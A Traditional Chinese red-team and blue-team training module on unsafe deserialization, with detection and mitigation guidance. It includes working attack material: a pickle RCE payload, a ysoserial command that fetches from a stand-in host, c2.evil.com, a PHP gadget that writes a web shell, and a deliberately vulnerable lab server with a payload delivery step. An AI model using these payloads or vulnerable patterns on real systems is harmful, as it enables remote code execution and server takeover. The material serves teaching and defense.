# R12.1 不安全反序列化與物件注入機制分析 (Unsafe Deserialization & Object Injection)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**不安全反序列化 (Unsafe Deserialization)** 發生於應用程式將未授權的位元組串流直接重構為記憶體物件時。其本質為：**「反序列化是具備『隱式執行 (Implicit Execution)』特性的物件實體化過程；攻擊者無須上傳任何檔案，只需利用目標環境 Classpath 中既有的代碼片段組裝成利用鏈 (Gadget Chain)，在自動觸發生命週期鉤子（魔術方法）時奪取系統控制權 (RCE)」**。

```
[攻擊者] ── 1. 投送特製序列化串流 (包含 Gadget Chain) ──► [反序列化端點 (Sink)]
                                                                  │
                                                                  ▼ 呼叫 readObject() / loads()
                                                     [虛擬機 / 直譯器引擎]
                                                                  │
                                                                  ├── 1. 識別 Magic Bytes (0xACED / 0x80)
                                                                  ├── 2. 自動實體化 Classpath 類別
                                                                  ▼ 3. 隱式調用魔術方法 (__reduce__, readObject)
                                                     [鏈式觸發 Reflection / 命令執行]
                                                                  │
                                                                  ▼
                                                     [取得伺服器控制權 (RCE)]
```

### 核心作戰決策與邊界
- **常見場景**：Cookie 狀態儲存 (Shiro RememberMe)、快取反序列化 (Redis/Memcached)、RPC/RMI 調用、訊息佇列。
- **作戰決策心流**：
  1. **特徵指紋識別**：透過 Magic Bytes 判斷序列化引擎與語言。
  2. **Gadget 環境勘察**：定位 Classpath 中的相依函式庫（Commons-Collections, Spring, Jackson 等）。
  3. **規避防護機制**：繞過黑名單檢查或 JEP 290 過濾器。
- **技術邊界**：
  - **與 Mass Assignment (R12.3) 差異**：R12.3 是透過 HTTP 欄位反射綁定覆寫屬性；R12.1 是利用虛擬機物件反序列化機制直接串聯 Gadget 執行代碼。

## 🔬 第一動：底層機制與跨語言協定特徵 (Mechanics & Magic Signatures)

### 各主流語言序列化特徵與觸發鉤子速查表

| 語言 / 格式 | Magic Bytes / 辨識特徵 | 核心隱式觸發鉤子 (Magic Methods) | 典型攻擊鏈 (Gadget Chains) |
| :--- | :--- | :--- | :--- |
| **Java 原生** | `AC ED 00 05` (Base64: `rO0AB`) | `readObject()`, `readResolve()` | Commons-Collections, Spring, BadAttributeValueExpException |
| **Python Pickle** | `\x80\x03` 或 `\x80\x04` (Base64: `gASV...`) | `__reduce__()`, `__reduce_ex__()` | `os.system`, `subprocess.Popen` 直接封裝 |
| **PHP 原生** | `O:<len>:"<class>":<props>:{...}` | `__wakeup()`, `__destruct()`, `__toString()` | POP Chains (Guzzle, Monolog, Laravel PendingBroadcast) |
| **.NET Binary** | `00 01 00 00 00 FF FF FF FF` (`AAEAAAD...`) | `ISerializable`, `OnDeserialized` | TypeConfuseDelegate, ActivitySurrogateSelector |
| **JSON/YAML** | `{"@type": "..."}`, `!!python/object` | Getter / Setter 反射調用 | Fastjson autoType, Jackson Polymorphic Deserialization |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心語言利用範例速查

#### 1. Python Pickle 任意代碼執行向量
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        # 隱式調用 os.system 執行指令
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# 輸出: gASVIQAAAAAAAACMBGJ1aWx0aW5zlIwGc3lzdGVtlJOUjAZ3aG9hbWWUhZRSlC4=
```

#### 2. Java Ysoserial 常用鏈速查
```bash
# 針對 CommonsCollections 依賴生成反向 Shell 載荷
java -jar ysoserial.jar CommonsCollections6 "curl http://c2.evil.com/shell" | base64
```

#### 3. PHP 物件注入向量 (POP Chain)
```php
class Logger {
    public $file = "shell.php";
    public $data = "<?php system($_GET['c']); ?>";
    function __destruct() { file_put_contents($this->file, $this->data); }
}
// 序列化字串: O:6:"Logger":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:29:"<?php system($_GET['c']); ?>";}
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **黑名單繞過技巧**：
  - Java JNDI 注入替代鏈：當 `Runtime.getRuntime().exec` 被阻斷時，使用 `JdbcRowSetImpl` 觸發遠端 LDAP 注入。
  - 二階反序列化 (Signed / Encrypted Deserialization)：尋找目標內部先解密再進行原生反序列化的盲區。
- **鑑識特徵**：
  - **進程樹異常**：Web 容器（如 `java.exe` / `w3wp.exe` / `uwsgi`）無故衍生 `cmd.exe`、`sh`、`bash` 或 `powershell.exe`。
  - **日誌特徵碼**：HTTP 請求參數、Cookie 中出現 Base64 編碼的 `rO0AB` 或 `gASV` 前綴。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **Java 原生反序列化** | EDR 偵測 `java` 衍生 `cmd.exe`/`sh` | 全面改用 JSON/Protobuf；配置 JEP 290 白名單過濾 | 尋找未被 JEP 290 涵蓋的替代利用鏈 |
| **Python Pickle 注入** | 流量中檢測到 Pickle 二進位 Opcode | 禁止使用 `pickle` 處理不可信資料，採用 JSON | 改向尋找 PyYAML 或特定 ORM 隱含反序列化 |
| **PHP POP Chain** | 存取日誌中出現 `O:\d+:"` 正則特徵 | 停用 `unserialize()`；使用 `json_decode()` | 框架升級若遺漏特定插件仍存在可利用類別 |
| **JNDI 遠端外聯** | 出站流量出現非預期 LDAP (389) / RMI (1099) | 嚴格限制主機 Egress 外連；升級高版本 JDK | 利用本地 Classpath 既有工廠類別進行本機繞過 |

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`deser_lab.py`，極簡 20 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import base64, pickle

class DeserHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length)
        
        try:
            # 缺陷：直接反序列化不可信的 Pickle 串流
            obj = pickle.loads(base64.b64decode(raw))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Processed successfully\n")
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())

ThreadingHTTPServer(("127.0.0.1", 8121), DeserHandler).serve_forever()
```

### 2. 三步驗證流程

1. **生成攻擊載荷**：
   ```bash
   python -c 'import pickle, base64, os; print(base64.b64encode(pickle.dumps(type("X", (), {"__reduce__": lambda s: (os.system, ("touch /tmp/pwned",))} )())).decode())'
   # 產出 Base64 載荷
   ```
2. **發送載荷觸發執行**：
   ```bash
   curl -s -X POST "http://127.0.0.1:8121/" -d "gASVIgAAAAAAAACMBGJ1aWx0aW5zlIwGc3lzdGVtlJOUjBFRb3VjaCAvdG1wL3B3bmVklIWUUpQu"
   ```
3. **驗證攻擊成果**：
   - 檢查系統是否已成功創建 `/tmp/pwned` 檔案，證實任意命令成功執行！

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼反序列化漏洞能在「不需上傳任何外部程式碼」的情況下達成 RCE？**  
  *分析思路*：目標環境的 Classpath / 函式庫中已經存在大量合法的程式碼片段。攻擊者只需將這些類別像積木一樣串聯（Gadget Chain），在反序列化引擎自動觸發生命週期鉤子時依序調用，最終導向執行系統命令。

- [ ] **Q2. Java、Python、PHP 的序列化二進位指紋（Magic Signatures）分別為何？**  
  *分析思路*：Java 為 `AC ED 00 05`（Base64: `rO0AB`）；Python Pickle 常見為 `\x80\x03` 或 `\x80\x04`（Base64: `gASV`）；PHP 原生為 `O:<length>:"<class_name>"`。

- [ ] **Q3. 為什麼對反序列化實施「黑名單過濾（如阻斷特定類別）」永遠不可靠？**  
  *分析思路*：黑名單防不勝防；一旦相依函式庫更新或引進新的第三方套件，隨時可能引入新的未知利用鏈；且攻擊者可透過動態代理、JNDI 注入等替代鏈繞過黑名單。

- [ ] **Q4. 鑑識分析中，伺服器遭受反序列化攻擊最典型的端點進程特徵是什麼？**  
  *分析思路*：Web 服務主程序（如 `java`、`python`、`php-fpm`、`w3wp.exe`）作為父進程，異常且突發地衍生子進程（如 `sh`、`bash`、`cmd.exe` 或 `powershell.exe`）。

- [ ] **Q5. 企業架構中徹底根治不安全反序列化的黃金基線為何？**  
  *分析思路*：徹底廢止任何語言的原生物件反序列化協議，通訊全面遷移至無邏輯代碼執行能力的純資料格式（JSON、Protobuf）；若歷史系統必須保留，強制套用 JEP 290 嚴格白名單校驗。
